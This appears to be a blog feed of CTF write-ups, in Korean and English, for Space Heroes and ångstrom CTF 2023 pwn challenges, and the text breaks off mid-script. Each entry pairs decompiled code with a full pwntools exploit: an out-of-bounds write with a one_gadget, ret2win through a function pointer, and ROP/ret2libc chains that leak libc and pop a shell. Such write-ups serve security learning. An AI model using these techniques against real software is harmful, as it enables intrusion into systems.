        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Cardassian Targeting System</span></span><br><span class="line"><span class="comment">// main</span></span><br><span class="line">  addr = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  pageSize = getpagesize();</span><br><span class="line">  posix_memalign(&amp;addr, pageSize, pageSize);    <span class="comment">// pageSize = 4096 0x1000</span></span><br><span class="line">  mprotect(addr, pageSize, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your name and rank &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  fgets(addr, <span class="number">64</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome back, %s\n&quot;</span>, addr);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Cardassian Targeting System Mk.2</span></span><br><span class="line"><span class="comment">// main</span></span><br><span class="line">  addr = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your name and rank &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  fgets(addr, <span class="number">64</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome back, %s\n&quot;</span>, addr);</span><br></pre></td></tr></table></figure><p><a href="https://jiravvit.github.io/230428-superheroesctf2023-Cardassian-Targeting-System/">이전 문제</a>와 다른 점은 쉘코드를 실행할 공간도 없고 권한도 없다는 점이다. 이 외에 <code>oob read</code>, <code>oob write</code>가 발생한다는 점은 똑같다. 운 좋게도 원가젯을 이용할 수 있어서 <code>stack</code>에 있는 <code>ret</code>에 넣어주면 된다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./challp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;spaceheroes-cardassian-targeting-system-2.chals.io&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;spaceheroes-cardassian-targeting-system-2.chals.io&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./challp&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;asdf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">20</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;coordinates:&#x27;</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) <span class="comment">#- 0x2384a</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc.address = libc_leak - <span class="number">0x1ec6a0</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">one_gadget_remote = <span class="number">0xe6c81</span></span><br><span class="line"><span class="comment"># stack_ret off = -3</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">3</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc.address + one_gadget_remote))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;th3_pah-wraith5_h4ve_judged_y0u_4nd_f0und_you_w0rthy&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - Death Star Targeting Computer (ret2win)</title>
      <link href="/230428-superheroesctf2023-Death-Star-Targeting-Computer/"/>
      <url>/230428-superheroesctf2023-Death-Star-Targeting-Computer/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; 245 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *choice; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">void</span> (*v6)(<span class="type">void</span>); <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_terminal();</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v6();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &gt; <span class="number">3</span> );</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      print_choice();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;choice);</span><br><span class="line">      <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int64)choice )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))alderaan;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))yavin_4;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))dantoine;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))tatooine;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))dagobah;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))hoth;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))bespin;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))choice;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Target Coordinates =&gt; %ld\n&quot;</span>, v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>v6</code>에 함수포인터를 담고 <code>v5</code>가 2일 때 <code>v6</code>을 출력해준다. 그리고 <code>v5</code>가 3일 때 <code>v6();</code>을 통해 이 변수에 저장된 주소를 실행한다. 가장 중요한 것은 입력값이 <code>v6</code>에 저장된다는 사실이다. 이것을 통해 원하는 주소를 실행할 수 있다.</p><p>마침 <code>win()</code> 함수가 있다.</p><img src="/images/230428-superheroesctf2023-Death-Star-Targeting-Computer/Screenshot 2023-04-28 at 18.25.13.png" width=500/><br><p>이렇게 IDA가 빨간색으로 변수를 표시하면 어셈블리를 보라는 뜻이다. 어셈블리를 살펴보면 아래와 같다.</p><img src="/images/230428-superheroesctf2023-Death-Star-Targeting-Computer/Screenshot 2023-04-28 at 18.38.38.png" width=300/><br><p>어셈블리에 적혀있는 것처럼 변수를 맞춰주면 되는데 이는 다른 함수들을 통해서 쉽게 맞춰줄 수 있다. 문제 제작자가 친절하게 다 넣어주었다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000151B ; __unwind &#123;</span><br><span class="line">.text:000000000000151B                 push    rbp</span><br><span class="line">.text:000000000000151C                 mov     rbp, rsp</span><br><span class="line">.text:000000000000151F                 mov     r14, 4Bh ; &#x27;K&#x27;</span><br><span class="line">.text:0000000000001526                 retn</span><br><span class="line">.text:0000000000001526 _Z9ignore_mev   endp ; sp-analysis failed</span><br><span class="line">.text:0000000000001526</span><br><span class="line">.text:0000000000001527</span><br><span class="line">.text:0000000000001527 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000001527</span><br><span class="line">.text:0000000000001527</span><br><span class="line">.text:0000000000001527 ; void sub_1527()</span><br><span class="line">.text:0000000000001527 sub_1527        proc near</span><br><span class="line">.text:0000000000001527                 mov     r13, 56h ; &#x27;V&#x27;</span><br><span class="line">.text:000000000000152E                 retn</span><br><span class="line">.text:000000000000152E sub_1527        endp</span><br><span class="line">.text:000000000000152E</span><br><span class="line">.text:000000000000152F</span><br><span class="line">.text:000000000000152F ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:000000000000152F</span><br><span class="line">.text:000000000000152F</span><br><span class="line">.text:000000000000152F ; void sub_152F()</span><br><span class="line">.text:000000000000152F sub_152F        proc near</span><br><span class="line">.text:000000000000152F                 mov     r15, 135h</span><br><span class="line">.text:0000000000001536                 retn</span><br><span class="line">.text:0000000000001536 sub_152F        endp</span><br></pre></td></tr></table></figure><p>다만 <code>151B</code> 주소에 있는 <code>push rbp</code>는 실행시키면 안된다. </p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;spaceheroes-death-star.chals.io&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;spaceheroes-death-star.chals.io&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./death_star_computer.bin&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./death_star_computer.bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;=&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) - <span class="number">0x136B</span></span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x1527</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x152f</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x151F</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x153a</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;y0u_m4y_f1re_wh3n_re4dy&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/230427-angstromctf2023-queue/"/>
      <url>/230427-angstromctf2023-queue/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ångstrom CTF 2023 review</title>
      <link href="/230427-angstromctf2023-0review/"/>
      <url>/230427-angstromctf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><p>I like this CTF because the difficulty level is right for me. (The difficulty of the challenges ranges from simple to hard.) And this CTF has a longer duration than others.</p><img src="/images/230427-angstromctf2023-0review/Screenshot 2023-04-27 at 15.22.47.png" width=700/><br><p>I want to solve <code>noleek</code>. But I couldn’t find how to use vulnerability for exploit. It turns out I didn’t understand about vulnerability. Although this CTF is over, I’ll solve this challenge.</p><p>I could find <code>FSB</code> vulnerabilities in most of the challenges. It was great chance for opportunity of practice exploiting <code>FSB</code> vulnerabilities.</p><p>Actually I participated in this CTF last year, and I remeber having fun. So I think I was able to participate in fun in this time as well :)</p><ul><li><a href="http://jiravvit.github.io/230427-angstromctf2023-1.queue/">http://jiravvit.github.io/230427-angstromctf2023-1.queue/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-2.gaga/">http://jiravvit.github.io/230427-angstromctf2023-2.gaga/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-3.leek/">http://jiravvit.github.io/230427-angstromctf2023-3.leek/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-4.widget/">http://jiravvit.github.io/230427-angstromctf2023-4.widget/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-5.slack/">http://jiravvit.github.io/230427-angstromctf2023-5.slack/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ångstrom CTF 2023 - gaga (simple rop)</title>
      <link href="/230427-angstromctf2023-2.gaga/"/>
      <url>/230427-angstromctf2023-2.gaga/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>Multipart challenge!<br>Note all use essentially the same Dockerfile. The flags are split among all three challenges. If you are already a pwn expert, the last challenge has the entire flag.<br><code>nc challs.actf.co 31300</code> gaga0<br><code>nc challs.actf.co 31301</code> gaga1<br><code>nc challs.actf.co 31302</code> gaga2 Dockerfile<br>Author: JoshDaBosh</p></blockquote><ul><li>[219 solves &#x2F; 70 points]</li></ul><p>Actually, I was able to find the flag when I only solved <code>gaga2</code>.</p><h2 id="gaga0"><a href="#gaga0" class="headerlink" title="gaga0"></a>gaga0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>I can find <code>bof</code> from <code>gets()</code>. And there are <code>win()</code> too. Just simple ret2win.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./gaga0&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31300</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./gaga0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x401236</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="gaga1"><a href="#gaga1" class="headerlink" title="gaga1"></a>gaga1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>It is same as <code>gaga0</code> But, This <code>win()</code> needs arguments to call.</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./gaga1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31301</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./gaga1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4013b3</span></span><br><span class="line">pop_rsi = <span class="number">0x4013b1</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x1337</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x4141</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret) + p64(<span class="number">0x401236</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="gaga2"><a href="#gaga2" class="headerlink" title="gaga2"></a>gaga2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>The difference between <code>gaga2</code> and <code>gaga1</code> is the existence of the <code>win()</code>. But Just do ret2libc.</p><h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./gaga2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31302</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./gaga2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4012b3</span></span><br><span class="line">pop_rsi = <span class="number">0x4013b1</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(ret) </span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;libc base &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span 